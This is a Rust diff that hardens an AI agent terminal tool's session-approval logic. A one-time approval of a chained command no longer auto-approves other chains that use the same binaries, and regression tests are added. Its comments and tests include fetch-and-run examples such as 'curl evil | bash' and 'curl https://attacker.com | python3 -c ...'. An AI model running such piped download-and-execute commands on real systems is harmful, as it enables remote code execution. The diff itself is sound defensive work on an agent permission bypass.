@@ -559,11 +559,18 @@ impl TerminalTool {
         // `curl ... | grep ...` since both curl and grep are safe/approved.
         if has_shell_ops {
             let session = self.session_approved.read().await;
-            // First check for exact full-command match (legacy behavior)
+            // 1) Exact full-command match against session approvals (chained
+            //    commands stored verbatim by `add_session_prefix`).
             if session.iter().any(|s| trimmed == s.as_str()) {
                 return true;
             }
-            // Then check per-segment: every segment's binary must be approved
+            // 2) Per-segment match: every segment's binary must be in the
+            //    PERMANENT prefix list (configured by the operator). We
+            //    deliberately do NOT consult `session` here — a simple-command
+            //    session approval for `curl` must not retroactively unlock
+            //    arbitrary chained commands like `curl evil | bash`. Operator-
+            //    configured permanent prefixes are trusted; ad-hoc session
+            //    approvals are not.
             let segments = split_command_segments(trimmed);
             if !segments.is_empty() {
                 return segments.iter().all(|seg| {
@@ -572,7 +579,6 @@ impl TerminalTool {
                         return true;
                     }
                     prefixes.iter().any(|p| p == "*" || binary == p.as_str())
-                        || session.iter().any(|p| p == "*" || binary == p.as_str())
                 });
             }
             return false;
@@ -599,23 +605,27 @@ impl TerminalTool {
     }
 
     /// Add a prefix to session-only approved list (cleared on restart).
-    /// For chained commands (containing shell operators), extracts the binary
-    /// name from each segment and stores each as a session-approved prefix.
-    /// This means approving `curl ... | python3 ... | head ...` will also
-    /// allow future commands like `curl ... | grep ... | head ...`.
-    /// For simple commands, stores the first word as prefix.
+    ///
+    /// For SIMPLE commands (no shell operators), stores the first word as a
+    /// prefix — any future command starting with the same binary is allowed.
+    ///
+    /// For CHAINED commands (containing shell operators), stores ONLY the
+    /// full trimmed command for exact-match matching. We intentionally do NOT
+    /// add per-segment binaries to the session prefix set: approving
+    /// `curl https://example.com | python3 -c '<safe>'` once must NOT later
+    /// auto-allow `curl https://attacker.com | python3 -c '<evil>'`. The
+    /// exact-match check in `is_allowed` handles legitimate re-runs.
     async fn add_session_prefix(&self, command: &str) {
         let trimmed = command.trim();
         let mut session = self.session_approved.write().await;
         if contains_shell_operator(trimmed) {
-            for seg in split_command_segments(trimmed) {
-                let binary = extract_segment_binary(seg);
-                if !binary.is_empty() && session.insert(binary.to_string()) {
-                    info!(
-                        prefix = %binary,
-                        "Session-approved prefix from chained command segment"
-                    );
-                }
+            // Store the full chained command verbatim; matched exactly by
+            // `is_allowed`'s legacy full-command check.
+            if session.insert(trimmed.to_string()) {
+                info!(
+                    command = %trimmed,
+                    "Session-approved full chained command (exact-match only)"
+                );
             }
         } else {
             let key = trimmed
@@ -3258,5 +3268,73 @@ mod tests {
 
         // Real pipe
         assert!(contains_shell_operator("ls | grep test"));
+    }
+
+    async fn make_tool_with_no_perm_prefixes() -> TerminalTool {
+        let db_file = tempfile::NamedTempFile::new().unwrap();
+        let db_url = format!("sqlite:{}", db_file.path().display());
+        let pool = SqlitePool::connect(&db_url).await.unwrap();
+        let (approval_tx, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
+        // Empty permanent prefix list — only session approvals exist.
+        let tool =
+            TerminalTool::new(vec![], approval_tx, 1, 1000, PermissionMode::Default, pool).await;
+        std::mem::forget(db_file);
+        tool
+    }
+
+    /// Regression: approving a chained command with "Allow Session" must NOT
+    /// blanket-approve future chained commands that happen to use the same
+    /// segment binaries. The session approval should match the FULL command
+    /// only.
+    #[tokio::test]
+    async fn session_approval_for_chained_command_does_not_leak_to_other_chains() {
+        let tool = make_tool_with_no_perm_prefixes().await;
+
+        let original = "curl https://example.com | python3 -c 'print(1)'";
+        let attacker = "curl https://attacker.com | python3 -c 'print(2)'";
+
+        // Approve the original chained command for this session.
+        tool.add_session_prefix(original).await;
+
+        // The exact same chain should be allowed (legitimate re-run).
+        assert!(
+            tool.is_allowed(original).await,
+            "exact-match re-run should be allowed"
+        );
+
+        // A different chain reusing the same segment binaries must NOT be
+        // allowed. This is the bug being fixed.
+        assert!(
+            !tool.is_allowed(attacker).await,
+            "session approval for one chained command must not auto-allow other chains \
+             with the same segment binaries"
+        );
+    }
+
+    /// Regression: simple-command session approvals (e.g. `curl https://x`)
+    /// must NOT bleed into chained-command auto-approval. Approving `curl`
+    /// for the session should only allow further simple `curl …` invocations,
+    /// not `curl evil | bash` style chains.
+    #[tokio::test]
+    async fn simple_session_approval_does_not_unlock_chained_commands() {
+        let tool = make_tool_with_no_perm_prefixes().await;
+
+        // Approve a simple curl command.
+        tool.add_session_prefix("curl https://example.com").await;
+        // Also approve a simple python3 invocation.
+        tool.add_session_prefix("python3 hello.py").await;
+
+        // Further simple curl commands are fine — that's the point of
+        // session-approving a binary prefix.
+        assert!(tool.is_allowed("curl https://other.com").await);
+
+        // But a chained command combining the two session-approved binaries
+        // must NOT be auto-allowed.
+        assert!(
+            !tool
+                .is_allowed("curl https://attacker.com | python3 -c 'evil'")
+                .await,
+            "chained commands must not auto-approve from simple-command session prefixes"
+        );
     }
 }
